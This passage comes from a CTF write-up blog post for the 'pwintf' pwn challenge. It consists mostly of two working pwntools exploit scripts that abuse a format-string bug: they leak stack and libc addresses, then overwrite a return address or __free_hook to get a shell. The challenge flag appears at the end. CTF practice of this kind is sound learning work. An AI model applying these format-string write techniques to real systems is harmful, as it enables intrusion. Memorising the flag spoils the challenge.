+<span class="line"><span># for all created processes...</span></span>
+<span class="line"><span># ./exploit.py DEBUG NOASLR</span></span>
+<span class="line"><span># ./exploit.py GDB HOST=example.com PORT=4141</span></span>
+<span class="line"><span>host = args.HOST or BinaryInfo.host</span></span>
+<span class="line"><span>port = int(args.PORT or BinaryInfo.port)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_local(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Execute the target binary locally'''</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return process([exe.path] + argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_remote(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Connect to the process on the remote host'''</span></span>
+<span class="line"><span>    io = connect(host, port)</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        gdb.attach(io, gdbscript=gdbscript)</span></span>
+<span class="line"><span>    return io</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Start the exploit against the target.'''</span></span>
+<span class="line"><span>    if args.LOCAL:</span></span>
+<span class="line"><span>        return start_local(argv, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return start_remote(argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span>#                    EXPLOIT GOES HERE</span></span>
+<span class="line"><span># ===========================================================</span></span>
+<span class="line"><span>#    Arch:     amd64-64-little</span></span>
+<span class="line"><span>#    RELRO:    Full RELRO</span></span>
+<span class="line"><span>#    Stack:    No canary found</span></span>
+<span class="line"><span>#    NX:       NX enabled</span></span>
+<span class="line"><span>#    PIE:      PIE enabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Specify your GDB script here for debugging</span></span>
+<span class="line"><span># GDB will be launched if the exploit is run via e.g.</span></span>
+<span class="line"><span># ./exploit.py GDB</span></span>
+<span class="line"><span>gdbscript = '''</span></span>
+<span class="line"><span>tbreak main</span></span>
+<span class="line"><span>continue</span></span>
+<span class="line"><span>'''.format(**locals())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def log_print(*msg):</span></span>
+<span class="line"><span>    log.info(" ".join(map(str,msg)))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def int2byte(x: int):</span></span>
+<span class="line"><span>    return x.to_bytes(exe.bytes, "little")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def wait_for_debugger(io):</span></span>
+<span class="line"><span>    if args.LOCAL and input("debugger?") == "y\n":</span></span>
+<span class="line"><span>        pid = util.proc.pidof(io)[0]</span></span>
+<span class="line"><span>        log_print("The pid is: " + str(pid))</span></span>
+<span class="line"><span>        util.proc.wait_for_debugger(pid)</span></span>
+<span class="line"><span>        log_print("press enter to continue")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== gadget stuff =========</span></span>
+<span class="line"><span>ret_addr = exe_rop.find_gadget(['ret'])[0]</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== libc stuff =========</span></span>
+<span class="line"><span>libc_bin_sh_offset = next(libc.search(b"/bin/sh"))</span></span>
+<span class="line"><span>log_print("libc /bin/sh offset", hex(libc_bin_sh_offset))</span></span>
+<span class="line"><span>libc_printf_offset = libc.sym["printf"]</span></span>
+<span class="line"><span>log_print("libc printf offset", hex(libc_printf_offset))</span></span>
+<span class="line"><span>libc_system_offset = libc.sym["system"]</span></span>
+<span class="line"><span>log_print("libc system offset", hex(libc_system_offset))</span></span>
+<span class="line"><span>libc_start_main_ret_offset = libc.libc_start_main_return</span></span>
+<span class="line"><span>log_print("libc_start_main_ret_offset", hex(libc_start_main_ret_offset))</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io = start()</span></span>
+<span class="line"><span>lp = log_print</span></span>
+<span class="line"><span>wait_for_debugger(io)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def read_stack_at(offset):</span></span>
+<span class="line"><span>    io.sendline(b"%%%d$p"%(offset+6))</span></span>
+<span class="line"><span>    a = io.recvuntil(b"0x")</span></span>
+<span class="line"><span>    return int(io.recv()[:-1:],16) &#x26; 0xffffffffffffffff</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def read_data_at(offset):</span></span>
+<span class="line"><span>    io.sendline(b"%%%d$x"%(offset+6))</span></span>
+<span class="line"><span>    a = io.recvuntil(b"0x")</span></span>
+<span class="line"><span>    return int(io.recv()[:-1:],16) &#x26; 0xffffffffffffffff</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def write_stack_at(offset,data,number_of_bytes):</span></span>
+<span class="line"><span>    byte_format = b"n"</span></span>
+<span class="line"><span>    if number_of_bytes == 2:</span></span>
+<span class="line"><span>        byte_format = b'hn'</span></span>
+<span class="line"><span>    if number_of_bytes == 1:</span></span>
+<span class="line"><span>        byte_format = b'hhn'</span></span>
+<span class="line"><span>    io.sendline(b"%%%dx%%%d$%s|IENDL"%(data,offset+6,byte_format))</span></span>
+<span class="line"><span>    io.recvuntil(b'IENDL')</span></span>
+<span class="line"><span>    return</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>soffset_to_stack_35 = 7</span></span>
+<span class="line"><span>soffset_stack_35 = 35</span></span>
+<span class="line"><span>soffset_stack_vuln_rip = 3</span></span>
+<span class="line"><span>soffset_libc_start_main_ret = 5</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># lp("free hook addr",hex(libc.sym["__free_hook"]))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>lp(io.recv())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>current_rsp_addr = read_stack_at(0) - 0x20</span></span>
+<span class="line"><span>lp("current rsp addr", hex(current_rsp_addr))</span></span>
+<span class="line"><span># address of mov eax,0 at sym.main</span></span>
+<span class="line"><span>program_base_addr = read_stack_at(soffset_stack_vuln_rip) - (exe.sym["main"] + 0x44)</span></span>
+<span class="line"><span>lp("program base addr", hex(program_base_addr))</span></span>
+<span class="line"><span>libc_base_addr = read_stack_at(soffset_libc_start_main_ret) - libc_start_main_ret_offset</span></span>
+<span class="line"><span>lp("libc base addr", hex(libc_base_addr))</span></span>
+<span class="line"><span>lp("/bin/sh", hex(libc_base_addr+libc_bin_sh_offset))</span></span>
+<span class="line"><span>pop_3_stack_ret_addr = program_base_addr + 0x131f</span></span>
+<span class="line"><span>pop_rbp_r12_r13_r14_r15_ret_addr = program_base_addr + 0x131b</span></span>
+<span class="line"><span>lp("pop_3_stack_ret_addr", hex(pop_3_stack_ret_addr))</span></span>
+<span class="line"><span>lp("pop_rbp_r12_r13_r14_r15_ret_addr", hex(pop_rbp_r12_r13_r14_r15_ret_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>printf_rip_addr = current_rsp_addr - 0x8</span></span>
+<span class="line"><span>lp("printf rip addr", hex(printf_rip_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># one gadget r15,rdx == null</span></span>
+<span class="line"><span>one_gadget_addr = libc_base_addr + 0xe6c81</span></span>
+<span class="line"><span>lp("one gadget addr",hex(one_gadget_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>stack_libc_start_main_ret_addr = current_rsp_addr + soffset_libc_start_main_ret * 0x8</span></span>
+<span class="line"><span>write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr) &#x26; 0xffff,2)</span></span>
+<span class="line"><span>write_stack_at(soffset_stack_35, one_gadget_addr &#x26; 0xffff,2)</span></span>
+<span class="line"><span>write_stack_at(soffset_to_stack_35,(stack_libc_start_main_ret_addr+0x2) &#x26; 0xffff,2)</span></span>
+<span class="line"><span>write_stack_at(soffset_stack_35, (one_gadget_addr >> 16) &#x26; 0xffff,2)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>write_stack_at(soffset_to_stack_35, printf_rip_addr &#x26; 0xffff,2)</span></span>
+<span class="line"><span># read_stack_at(soffset_stack_35)</span></span>
+<span class="line"><span>write_stack_at(soffset_stack_35, pop_rbp_r12_r13_r14_r15_ret_addr &#x26; 0xffff,2)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.interactive()</span></span></code></pre>
+<p><a id="write-rop-to-chain-to-free-hook-intended-solution"></a></p>
+<h2 id="write-rop-to-chain-to-free_hook-intended-solution">write rop to chain to free_hook (intended solution)</h2>
+<p>after discuss with the author of the challenge. The intended solution for this one is actually using another debug feature - <strong>free_hook</strong></p>
+<p>So basically, libc have an writable function address called <code>__free_hook</code>. the function will be called every time <code>free()</code> is called.</p>
+<p>Therefore, by write address into <code>__free_hook</code>, we can escape from while loop and get into a rop chain</p>
+<p><a id="exploit-py-1"></a></p>
+<h3 id="exploitpy-1">exploit.py</h3>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#!/usr/bin/env python3</span></span>
+<span class="line"><span># -*- coding: utf-8 -*-</span></span>
+<span class="line"><span># This exploit template was generated via:</span></span>
+<span class="line"><span># $ pwn template --host localhost --port 1442 pwintf</span></span>
+<span class="line"><span>from pwn import *</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Set up pwntools for the correct architecture</span></span>
+<span class="line"><span>exe = context.binary = ELF('pwintf')</span></span>
+<span class="line"><span>libc = ELF('libc.so.6')</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Many built-in settings can be controlled on the command-line and show up</span></span>
+<span class="line"><span># in "args".  For example, to dump all data sent/received, and disable ASLR</span></span>
+<span class="line"><span># for all created processes...</span></span>
+<span class="line"><span># ./exploit.py DEBUG NOASLR</span></span>
+<span class="line"><span># ./exploit.py GDB HOST=example.com PORT=4141</span></span>
+<span class="line"><span>host = args.HOST or 'localhost'</span></span>
+<span class="line"><span>port = int(args.PORT or 1442)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_local(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Execute the target binary locally'''</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return process([exe.path] + argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_remote(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Connect to the process on the remote host'''</span></span>
+<span class="line"><span>    io = connect(host, port)</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        gdb.attach(io, gdbscript=gdbscript)</span></span>
+<span class="line"><span>    return io</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Start the exploit against the target.'''</span></span>
+<span class="line"><span>    if args.LOCAL:</span></span>
+<span class="line"><span>        return start_local(argv, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return start_remote(argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Specify your GDB script here for debugging</span></span>
+<span class="line"><span># GDB will be launched if the exploit is run via e.g.</span></span>
+<span class="line"><span># ./exploit.py GDB</span></span>
+<span class="line"><span>gdbscript = '''</span></span>
+<span class="line"><span>tbreak main</span></span>
+<span class="line"><span>continue</span></span>
+<span class="line"><span>'''.format(**locals())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>#===========================================================</span></span>
+<span class="line"><span>#                    EXPLOIT GOES HERE</span></span>
+<span class="line"><span>#===========================================================</span></span>
+<span class="line"><span># Arch:     amd64-64-little</span></span>
+<span class="line"><span># RELRO:    Full RELRO</span></span>
+<span class="line"><span># Stack:    No canary found</span></span>
+<span class="line"><span># NX:       NX enabled</span></span>
+<span class="line"><span># PIE:      PIE enabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io = start()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.recvline()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.sendline(b"%11$p\n%6$p\n%13$p")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>libc.address = int(io.recvuntil(b"\n", drop=True), 0) - libc.libc_start_main_return</span></span>
+<span class="line"><span>stack_addr_0 = int(io.recvuntil(b"\n", drop=True), 0) - 0x20</span></span>
+<span class="line"><span>stack_addr_1 = int(io.recvuntil(b"\n", drop=True), 0)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>stack_offset = 6 + (stack_addr_1 - stack_addr_0) // 8</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.info("Libc: " + hex(libc.address))</span></span>
+<span class="line"><span>io.info("Stack 0: " + hex(stack_addr_0))</span></span>
+<span class="line"><span>io.info("Stack 1: " + hex(stack_addr_1))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def write_on_stack(value, offset):</span></span>
+<span class="line"><span>    for i in range(4):</span></span>
+<span class="line"><span>        io.sendline("%{}c%13$hn".format((stack_addr_0 + 8 * (offset - 6) + 2 * i) % 0x10000).encode())</span></span>
+<span class="line"><span>        io.recvline(1)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        chars = (value // (0x10000 ** i)) % 0x10000</span></span>
+<span class="line"><span>        if chars == 0:</span></span>
+<span class="line"><span>            io.sendline("%{}$hn".format(stack_offset).encode())</span></span>
+<span class="line"><span>        else:</span></span>
+<span class="line"><span>            io.sendline("%{}c%{}$hn".format(chars, stack_offset).encode())</span></span>
+<span class="line"><span>        io.recvline(1)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>print(hex(libc.address))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>write_on_stack(libc.sym['__free_hook'], 8)</span></span>
+<span class="line"><span>write_on_stack(libc.sym['__free_hook'] + 2, 9)</span></span>
+<span class="line"><span>write_on_stack(libc.sym['__free_hook'] + 4, 10)</span></span>
+<span class="line"><span>write_on_stack(libc.sym['__free_hook'] + 6, 11)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>target = libc.sym['system']</span></span>
+<span class="line"><span>payload = "/bin/bash #"</span></span>
+<span class="line"><span>written = len(payload)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chars = ((target % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span></span>
+<span class="line"><span>written += chars</span></span>
+<span class="line"><span>payload += "%{}c".format(chars)</span></span>
+<span class="line"><span>payload += "%8$hn"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chars = (((target // 0x10000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span></span>
+<span class="line"><span>written += chars</span></span>
+<span class="line"><span>payload += "%{}c".format(chars)</span></span>
+<span class="line"><span>payload += "%9$hn"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chars = (((target // 0x100000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span></span>
+<span class="line"><span>written += chars</span></span>
+<span class="line"><span>payload += "%{}c".format(chars)</span></span>
+<span class="line"><span>payload += "%10$hn"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chars = (((target // 0x1000000000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000</span></span>
+<span class="line"><span>written += chars</span></span>
+<span class="line"><span>payload += "%{}c".format(chars)</span></span>
+<span class="line"><span>payload += "%11$hn"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.sendline(payload.encode())</span></span>
+<span class="line"><span>io.recvline()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.interactive()</span></span></code></pre>
+<h2 id="flag">flag</h2>
+<p>maple{h0p3_1t_d1dnt_t4k3_l0ng}</p></div><footer class="post-tags"><a href="/blog/tags/pwn/">#pwn</a><a href="/blog/tags/ctf/">#ctf</a><a href="/blog/tags/writeup/">#writeup</a></footer><nav class="post-navigation" aria-label="Adjacent posts"><div><a href="/blog/posts/yao-emo-le-55555/"><span class="eyebrow">Older</span>要emo了要 要抑郁了要</a></div><div><a href="/blog/posts/why-pixilation-is-bad/"><span class="eyebrow">Newer</span>why pixilation a text is bad</a></div></nav></article></main><footer class="site-footer"><span>&copy; 2026 Aynakeya</span><div><a href="/rss.xml">RSS</a><a href="/blog/archives/">Archives</a><a href="#top">Back to top &uarr;</a></div></footer></div></div></body></html>
